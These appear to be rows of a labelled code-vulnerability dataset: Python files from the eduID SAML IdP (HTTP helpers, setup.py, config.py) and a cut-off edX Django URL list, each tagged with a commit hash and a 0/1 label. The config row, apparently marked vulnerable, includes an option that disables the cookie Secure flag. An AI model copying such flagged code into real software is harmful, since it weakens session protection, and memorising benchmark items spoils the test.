    if not status:
        status = '200 Ok'

    try:
        if not fp:
            fp = open(filename)
        text = fp.read()
    except IOError:
        raise eduid_idp.error.NotFound()
    finally:
        fp.close()

    logger.debug(""Serving {!s}, status={!r} content-type {!s}, length={!r}"".format(
        filename, status, content_type, len(text)))

    start_response(status, [('Content-Type', content_type)])
    return text


def get_content_type(filename):
    """"""
    Figure out the content type to use from a filename.

    :param filename: string
    :return: string like 'text/html'

    :type filename: string
    :rtype: string
    """"""
    types = {'ico': 'image/x-icon',
             'png': 'image/png',
             'html': 'text/html',
             'css': 'text/css',
             'js': 'application/javascript',
             'txt': 'text/plain',
             'xml': 'text/xml',
             'svg': 'image/svg+xml',
             'woff': 'application/font-woff',
             'eot': 'application/vnd.ms-fontobject',
             'ttf': 'application/x-font-ttf',
             }
    ext = filename.rsplit('.', 1)[-1]
    if ext not in types:
        return None
    return types[ext]


# ----------------------------------------------------------------------------
# Cookie handling
# ----------------------------------------------------------------------------
def read_cookie(logger):
    """"""
    Decode information stored in a browser cookie.

    The idpauthn cookie holds a value used to lookup `userdata' in IDP.cache.

    :param logger: logging logger
    :returns: string with cookie content, or None

    :type logger: logging.Logger
    :rtype: string | None
    """"""
    cookie = cherrypy.request.cookie
    logger.debug(""Parsing cookie(s): {!s}"".format(cookie))
    _authn = cookie.get(""idpauthn"")
    if _authn:
        try:
            cookie_val = base64.b64decode(_authn.value)
            logger.debug(""idpauthn cookie value={!r}"".format(cookie_val))
            return cookie_val
        except KeyError:
            return None
    else:
        logger.debug(""No idpauthn cookie"")
    return None


def delete_cookie(name, logger, config):
    """"""
    Ask browser to delete a cookie.

    :param name: cookie name as string
    :param logger: logging instance
    :param config: IdPConfig instance
    :return: True on success

    :type name: string
    :type logger: logging.Logger
    :type config: eduid_idp.config.IdPConfig
    :rtype: bool
    """"""
    logger.debug(""Delete cookie: {!s}"".format(name))
    return set_cookie(name, '/', logger, config)


def set_cookie(name, path, logger, config, value=''):
    """"""
    Ask browser to store a cookie.

    Since eduID.se is HTTPS only, the cookie parameter `Secure' is set.

    :param name: Cookie identifier (string)
    :param path: The path specification for the cookie
    :param logger: logging instance
    :param config: IdPConfig instance
    :param value: The value to assign to the cookie

    :return: True on success

    :type name: string
    :type path: string
    :type logger: logging.Logger
    :type config: eduid_idp.config.IdPConfig
    :type value: string
    :rtype: bool
    """"""
    cookie = cherrypy.response.cookie
    cookie[name] = base64.b64encode(str(value))
    cookie[name]['path'] = path
    if not config.insecure_cookies:
        cookie[name]['secure'] = True  # ask browser to only send cookie using SSL/TLS
    if config.httponly_cookies:
        cookie[name]['httponly'] = True # protect against common XSS vulnerabilities
    logger.debug(""Set cookie : {!s}"".format(cookie))
    return True


def parse_query_string():
    """"""
    Parse HTML request query string into a dict like

    {'Accept': string,
     'Host': string,
    }

    NOTE: Only the first header value for each header is included in the result.

    :return: parsed query string

    :rtype: dict
    """"""
    query = None
    if cherrypy.request.query_string:
        _qs = cherrypy.request.query_string
        query = dict([(k, v[0]) for k, v in parse_qs(_qs).items()])
    return query


def parse_accept_lang_header(lang_string):
    """"""
    Parses the lang_string, which is the body of an HTTP Accept-Language
    header, and returns a list of (lang, q-value), ordered by 'q' values.

    Any format errors in lang_string results in an empty list being returned.

    :param lang_string: Accept-Language header

    :type lang_string: string
    :rtype: list[(string, string)]
    """"""
    return eduid_idp.thirdparty.parse_accept_lang_header(lang_string)


def localized_resource(start_response, filename, config, logger=None, status=None):
    """"""
    Locate a static page in the users preferred language. Such pages are
    packaged in separate Python packages that allow access through
    pkg_resource.

    :param start_response: WSGI-like start_response function
    :param filename: string, name of resource
    :param config: IdP config instance
    :param logger: optional logging logger, for debug log messages
    :param status: string, optional HTML result data ('404 Not Found' for example)
    :return: HTML response data

    :type start_response: function
    :type filename: string
    :type config: eduid_idp.config.IdPConfig
    :type logger: logging.Logger
    :type status: string
    :rtype: string
    """"""
    _LANGUAGE_RE = re.compile(
            r'''
            ([A-Za-z]{1,8}(?:-[A-Za-z0-9]{1,8})*|)      # ""en"", ""en-au"", ""x-y-z"", ""es-419"", NOT the ""*""
            ''', re.VERBOSE)

    # Look for some static page in user preferred language
    languages = eduid_idp.mischttp.parse_accept_lang_header(cherrypy.request.headers.get('Accept-Language', ''))
    if logger:
        logger.debug(""Client language preferences: {!r}"".format(languages))
    languages = [lang for (lang, q_val) in languages[:50]]  # cap somewhere to prevent DoS
    if not config.default_language in languages and config.default_language:
        languages.append(config.default_language)

    if languages:
        logger.debug(""Languages list : {!r}"".format(languages))
        for lang in languages:
            if _LANGUAGE_RE.match(lang):
                for (package, path) in config.content_packages:
                    langfile = path + '/' + lang.lower() + '/' + filename  # pkg_resources paths do not use os.path.join
                    if logger:
                        logger.debug('Looking for package {!r}, language {!r}, path: {!r}'.format(
                            package, lang, langfile))
                    try:
                        res = pkg_resources.resource_stream(package, langfile)
                        return eduid_idp.mischttp.static_file(start_response, langfile, logger, fp=res, status=status)
                    except IOError:
                        pass

    # default language file
    static_fn = eduid_idp.mischttp.static_filename(config, filename)
    logger.debug(""Looking for {!r} at default location (static_dir {!r}): {!r}"".format(
        filename, config.static_dir, static_fn))
    if not static_fn:
        logger.warning(""Failed locating page {!r} in an accepted language or the default location"".format(filename))
        return None
    logger.debug('Using default file for {!r}: {!r}'.format(filename, static_fn))
    return eduid_idp.mischttp.static_file(start_response, static_fn, logger, status=status)


def get_http_method():
    """"""
    Get the HTTP method verb for this request.

    This function keeps other modules from having to know that CherryPy is used.

    :return: 'GET', 'POST' or other
    :rtype: string
    """"""
    return cherrypy.request.method


def get_remote_ip():
    """"""
    Get the remote IP address for this request.

    This function keeps other modules from having to know that CherryPy is used.

    :return: Client IP address
    :rtype: string
    """"""
    return cherrypy.request.remote.ip
/n/n/n",0
31,e106ab1a6491342c9084772fba9f5c7b29be8d65,"/setup.py/n/n#!/usr/bin/env python
#
from setuptools import setup, find_packages
import sys, os
from distutils import versionpredicate

here = os.path.abspath(os.path.dirname(__file__))
README = open(os.path.join(here, 'README')).read()

version = '0.3.22'

install_requires = [
    'pymongo>=2.8,<3',
    'pysaml2==1.2.0beta5',
    'python-memcached==1.53',
    'cherrypy==3.2.4',
    'vccs_client==0.4.1',
    'eduid_am>=0.5.3',
]

testing_extras = [
    'nose==1.2.1',
    'coverage==3.6',
]

setup(name='eduid_idp',
      version=version,
      description=""eduID SAML frontend IdP"",
      long_description=README,
      classifiers=[
        # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers
        ],
      keywords='eduID SAML',
      author='Fredrik Thulin',
      author_email='fredrik@thulin.net',
      license='BSD',
      packages=['eduid_idp',],
      package_dir = {'': 'src'},
      #include_package_data=True,
      #package_data = { },
      zip_safe=False,
      install_requires=install_requires,
      extras_require={
        'testing': testing_extras,
        },
      entry_points={
        'console_scripts': ['eduid_idp=eduid_idp.idp:main',
                            ]
        }
      )
/n/n/n/src/eduid_idp/config.py/n/n#
# Copyright (c) 2013, 2014 NORDUnet A/S
# All rights reserved.
#
#   Redistribution and use in source and binary forms, with or
#   without modification, are permitted provided that the following
#   conditions are met:
#
#     1. Redistributions of source code must retain the above copyright
#        notice, this list of conditions and the following disclaimer.
#     2. Redistributions in binary form must reproduce the above
#        copyright notice, this list of conditions and the following
#        disclaimer in the documentation and/or other materials provided
#        with the distribution.
#     3. Neither the name of the NORDUnet nor the names of its
#        contributors may be used to endorse or promote products derived
#        from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# ""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#
# Author : Fredrik Thulin <fredrik@thulin.net>
#
""""""
Configuration (file) handling for eduID IdP.
""""""

import os
import ConfigParser

_CONFIG_DEFAULTS = {'debug': False,  # overwritten in IdPConfig.__init__()
                    'syslog_debug': '0',              # '1' for True, '0' for False
                    'num_threads': '8',
                    'logdir': None,
                    'logfile': None,
                    'syslog_socket': None,            # syslog socket to log to (/dev/log maybe)
                    'listen_addr': '0.0.0.0',
                    'listen_port': '8088',
                    'pysaml2_config': 'idp_conf.py',  # path prepended in IdPConfig.__init__()
                    'fticks_secret_key': None,
                    'fticks_format_string': 'F-TICKS/SWAMID/2.0#TS={ts}#RP={rp}#AP={ap}#PN={pn}#AM={am}#',
                    'static_dir': None,
                    'ssl_adapter': 'builtin',  # one of cherrypy.wsgiserver.ssl_adapters
                    'server_cert': None,  # SSL cert filename
                    'server_key': None,   # SSL key filename
                    'cert_chain': None,   # SSL certificate chain filename, or None
                    'userdb_mongo_uri': None,
                    'userdb_mongo_database': None,
                    'sso_session_lifetime': '15',  # Lifetime of SSO session in minutes
                    'sso_session_mongo_uri': None,
                    'raven_dsn': None,
                    'content_packages': [],  # List of Python packages (""name:path"") with content resources
                    'verify_request_signatures': '0',  # '1' for True, '0' for False
                    'status_test_usernames': [],
                    'signup_link': '#',  # for login.html
                    'dashboard_link': '#',  # for forbidden.html
                    'password_reset_link': '#',  # for login.html
                    'default_language': 'en',
                    'base_url': None,
                    'default_eppn_scope': None,
                    'authn_info_mongo_uri': None,
                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100
                    'login_state_ttl': '5',   # time to complete an IdP login, in minutes
                    'default_scoped_affiliation': None,
                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL
                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag
                    }

_CONFIG_SECTION = 'eduid_idp'


class IdPConfig(object):

    """"""
    Class holding IdP application configuration.

    Loads configuration from an INI-file at instantiation.

    :param filename: string, INI-file name
    :param debug: boolean, default debug value
    :raise ValueError: if INI-file can't be parsed
    """"""

    def __init__(self, filename, debug):
        self._parsed_content_packages = None
        self._parsed_status_test_usernames = None
        self.section = _CONFIG_SECTION
        _CONFIG_DEFAULTS['debug'] = str(debug)
        cfgdir = os.path.dirname(filename)
        _CONFIG_DEFAULTS['pysaml2_config'] = os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config'])
        self.config = ConfigParser.ConfigParser(_CONFIG_DEFAULTS)
        if not self.config.read([filename]):
            raise ValueError(""Failed loading config file {!r}"".format(filename))

    @property
    def num_threads(self):
        """"""
        Number of worker threads to start (integer).

        EduID IdP spawns multiple threads to make use of all CPU cores in the password
        pre-hash function.
        Number of threads should probably be about 2x number of cores to 4x number of
        cores (if hyperthreading is available).
        """"""
        return self.config.getint(self.section, 'num_threads')

    @property
    def logdir(self):
        """"""
        Path to CherryPy logfiles (string). Something like '/var/log/idp' maybe.
        """"""
        res = self.config.get(self.section, 'logdir')
        if not res:
            res = None
        return res

    @property
    def logfile(self):
        """"""
        Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe.
        """"""
        res = self.config.get(self.section, 'logfile')
        if not res:
            res = None
        return res

    @property
    def syslog_socket(self):
        """"""
        Syslog socket to log to (string). Something like '/dev/log' maybe.
        """"""
        res = self.config.get(self.section, 'syslog_socket')
        if not res:
            res = None
        return res

    @property
    def debug(self):
        """"""
        Set to True to log debug messages (boolean).
        """"""
        return self.config.getboolean(self.section, 'debug')

    @property
    def syslog_debug(self):
        """"""
        Set to True to log debug messages to syslog (also requires syslog_socket) (boolean).
        """"""
        return self.config.getboolean(self.section, 'syslog_debug')

    @property
    def listen_addr(self):
        """"""
        IP address to listen on.
        """"""
        return self.config.get(self.section, 'listen_addr')

    @property
    def listen_port(self):
        """"""
        The port the IdP authentication should listen on (integer).
        """"""
        return self.config.getint(self.section, 'listen_port')

    @property
    def pysaml2_config(self):
        """"""
        pysaml2 configuration file. Separate config file with SAML related parameters.
        """"""
        return self.config.get(self.section, 'pysaml2_config')

    @property
    def fticks_secret_key(self):
        """"""
        SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data
        on every login.
        """"""
        return self.config.get(self.section, 'fticks_secret_key')

    @property
    def fticks_format_string(self):
        """"""
        Get SAML F-TICKS format string.
        """"""
        return self.config.get(self.section, 'fticks_format_string')

    @property
    def static_dir(self):
        """"""
        Directory with static files to be served.
        """"""
        return self.config.get(self.section, 'static_dir')

    @property
    def ssl_adapter(self):
        """"""
        CherryPy SSL adapter class to use (must be one of cherrypy.wsgiserver.ssl_adapters)
        """"""
        return self.config.get(self.section, 'ssl_adapter')

    @property
    def server_cert(self):
        """"""
        SSL certificate filename (None == SSL disabled)
        """"""
        return self.config.get(self.section, 'server_cert')

    @property
    def server_key(self):
        """"""
        SSL private key filename (None == SSL disabled)
        """"""
        return self.config.get(self.section, 'server_key')

    @property
    def cert_chain(self):
        """"""
        SSL certificate chain filename
        """"""
        return self.config.get(self.section, 'cert_chain')

    @property
    def userdb_mongo_uri(self):
        """"""
        UserDB MongoDB connection URI (string). See MongoDB documentation for details.
        """"""
        return self.config.get(self.section, 'userdb_mongo_uri')

    @property
    def userdb_mongo_database(self):
        """"""
        UserDB database name.
        """"""
        return self.config.get(self.section, 'userdb_mongo_database')

    @property
    def sso_session_lifetime(self):
        """"""
        Lifetime of SSO session (in minutes).

        If a user has an active SSO session, they will get SAML assertions made
        without having to authenticate again (unless SP requires it through
        ForceAuthn).

        The total time a user can access a particular SP would therefor be
        this value, plus the pysaml2 lifetime of the assertion.
        """"""
        return self.config.getint(self.section, 'sso_session_lifetime')

    @property
    def sso_session_mongo_uri(self):
        """"""
        SSO session MongoDB connection URI (string). See MongoDB documentation for details.

        If not set, an in-memory SSO session cache will be used.
        """"""
        return self.config.get(self.section, 'sso_session_mongo_uri')

    @property
    def raven_dsn(self):
        """"""
        Raven DSN (string) for logging exceptions to Sentry.
        """"""
        return self.config.get(self.section, 'raven_dsn')

    @property
    def content_packages(self):
        """"""
        Get list of tuples with packages and paths to content resources, such as login.html.

        The expected format in the INI file is

            content_packages = pkg1:some/path/, pkg2:foo

        :return: list of (pkg, path) tuples
        """"""
        if self._parsed_content_packages:
            return self._parsed_content_packages
        value = self.config.get(self.section, 'content_packages')
        res = []
        for this in value.split(','):
            this = this.strip()
            name, _sep, path, = this.partition(':')
            res.append((name, path))
        self._parsed_content_packages = res
        return res

    @property
    def verify_request_signatures(self):
        """"""
        Verify request signatures, if they exist.

        This defaults to False since it is a trivial DoS to consume all the IdP:s
        CPU resources if this is set to True.
        """"""
        res = self.config.get(self.section, 'verify_request_signatures')
        return bool(int(res))

    @property
    def status_test_usernames(self):
        """"""
        Get list of usernames valid for use with the /status URL.

        If this list is ['*'], all usernames are allowed for /status.

        :return: list of usernames

        :rtype: list[string]
        """"""
        if self._parsed_status_test_usernames:
            return self._parsed_status_test_usernames
        value = self.config.get(self.section, 'status_test_usernames')
        res = [x.strip() for x in value.split(',')]
        self._parsed_status_test_usernames = res
        return res

    @property
    def signup_link(self):
        """"""
        URL (string) for use in simple templating of login.html.
        """"""
        return self.config.get(self.section, 'signup_link')

    @property
    def dashboard_link(self):
        """"""
        URL (string) for use in simple templating of forbidden.html.
        """"""
        return self.config.get(self.section, 'dashboard_link')

    @property
    def password_reset_link(self):
        """"""
        URL (string) for use in simple templating of login.html.
        """"""
        return self.config.get(self.section, 'password_reset_link')

    @property
    def default_language(self):
        """"""
        Default language code to use when looking for web pages ('en').
        """"""
        return self.config.get(self.section, 'default_language')

    @property
    def base_url(self):
        """"""
        Base URL of the IdP. The default base URL is constructed from the
        Request URI, but for example if there is a load balancer/SSL
        terminator in front of the IdP it might be required to specify
        the URL of the service.
        """"""
        return self.config.get(self.section, 'base_url')

    @property
    def default_eppn_scope(self):
        """"""
        The scope to append to any unscoped eduPersonPrincipalName
        attributes found on users in the userdb.
        """"""
        return self.config.get(self.section, 'default_eppn_scope')

    @property
    def authn_info_mongo_uri(self):
        """"""
        Authn info (failed logins etc.) MongoDB connection URI (string).
        See MongoDB documentation for details.

        If not set, Kantara authn logs will not be maintained.
        """"""
        return self.config.get(self.section, 'authn_info_mongo_uri')

    @property
    def max_authn_failures_per_month(self):
        """"""
        Disallow login for a user after N failures in a given month.

        This is said to be an imminent Kantara requirement.
        """"""
        return self.config.getint(self.section, 'max_authn_failures_per_month')

    @property
    def login_state_ttl(self):
        """"""
        Lifetime of state kept in IdP login phase.

        This is the time, in minutes, a user has to complete the login phase.
        After this time, login cannot complete because the SAMLRequest, RelayState
        and possibly other needed information will be forgotten.
        """"""
        return self.config.getint(self.section, 'login_state_ttl')

    @property
    def default_scoped_affiliation(self):
        """"""
        Add a default eduPersonScopedAffiliation if none is returned from the
        attribute manager.
        """"""
        return self.config.get(self.section, 'default_scoped_affiliation')

    @property
    def vccs_url(self):
        """"""
        URL to use with VCCS client. BCP is to have an nginx or similar on
        localhost that will proxy requests to a currently available backend
        using TLS.
        """"""
        return self.config.get(self.section, 'vccs_url')

    @property
    def insecure_cookies(self):
        """"""
        Set to True to NOT set HTTP Cookie 'secure' flag (boolean).
        """"""
        return self.config.getboolean(self.section, 'insecure_cookies')
/n/n/n",1
32,4e4c209ae3deb4c78bcec89c181516af8604b450,"lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',
            'staticbook.views.index_shifted'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
